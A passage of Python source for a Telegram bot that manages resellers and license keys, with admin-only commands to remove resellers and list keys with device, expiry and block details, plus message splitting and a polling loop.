            f"New balance: {resellers[reseller_id]} Rs"
        )
        bot.reply_to(message, response)
    except ValueError:
        bot.reply_to(message, "Invalid amount")

# Remove reseller
@bot.message_handler(commands=['removereseller'])
def remove_reseller(message):
    """Remove a reseller."""
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "Usage: /removereseller <reseller_id>")
        return
    reseller_id = command_parts[1]
    if reseller_id not in resellers:
        bot.reply_to(message, "Reseller ID not found.")
        return
    del resellers[reseller_id]
    save_resellers(resellers)
    bot.reply_to(message, f"Reseller {reseller_id} has been removed successfully")

# List all keys with details
@bot.message_handler(commands=['listkeys'])
def list_keys(message):
    """List all keys with details."""
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    
    # Reload keys to ensure we have the latest data
    global keys
    keys = read_keys()
    
    response = "Key List\n"
    if keys:
        for key_name, key_data in sorted(keys.items()):
            generated_by = key_data.get("generated_by", "Unknown")
            generated_time = key_data.get("generated_time", "Unknown")
            devices = key_data.get("devices", [])
            blocked = key_data.get("blocked", False)
            active = any(
                user_id in users and 
                datetime.datetime.now(IST) < datetime.datetime.strptime(users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST) 
                for user_id in devices
            ) and not blocked
            status = "Active" if active else "Inactive"
            device_details = "\n".join([
                f"  User ID: {user_id}\n  Username: @{escape_markdown_v2(bot.get_chat(user_id).username if bot.get_chat(user_id).username else 'Unknown')}\n  Expiration: {users.get(user_id, 'N/A')}" 
                for user_id in devices
            ]) if devices else "No users"
            blocker_username = escape_markdown_v2(key_data.get("blocked_by_username", "N/A"))
            block_time = key_data.get("blocked_time", "N/A")
            response += (
                f"Key: {key_name}\n"
                f"Generated by: @{escape_markdown_v2(generated_by)}\n"
                f"Generated on: {generated_time}\n"
                f"Duration: {key_data['duration']}\n"
                f"Device Limit: {key_data['device_limit']}\n"
                f"Devices:\n{device_details}\n"
                f"Status: {status}\n"
                f"Blocked: {blocked}\n"
                f"Blocked by: @{blocker_username}\n"
                f"Blocked on: {block_time}\n\n"
            )
    else:
        response = "No keys found in keys\\.json\\."
    
    # Split response if too long for Telegram
    max_message_length = 4096
    if len(response) > max_message_length:
        parts = []
        current_part = ""
        for line in response.split("\n"):
            if len(current_part) + len(line) + 1 > max_message_length:
                parts.append(current_part)
                current_part = line + "\n"
            else:
                current_part += line + "\n"
        if current_part:
            parts.append(current_part)
        for part in parts:
            try:
                bot.reply_to(message, part, parse_mode='MarkdownV2')
            except Exception as e:
                with open("error_log.txt", "a") as log_file:
                    log_file.write(f"Error in list_keys at {datetime.datetime.now(IST)}: {str(e)}\nResponse: {part}\n")
                bot.reply_to(message, "An error occurred. Please contact the admin.")
    else:
        try:
            bot.reply_to(message, response, parse_mode='MarkdownV2')
        except Exception as e:
            with open("error_log.txt", "a") as log_file:
                log_file.write(f"Error in list_keys at {datetime.datetime.now(IST)}: {str(e)}\nResponse: {response}\n")
            bot.reply_to(message, "An error occurred. Please contact the admin.")

if __name__ == "__main__":
    load_data()
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(e)
            time.sleep(1)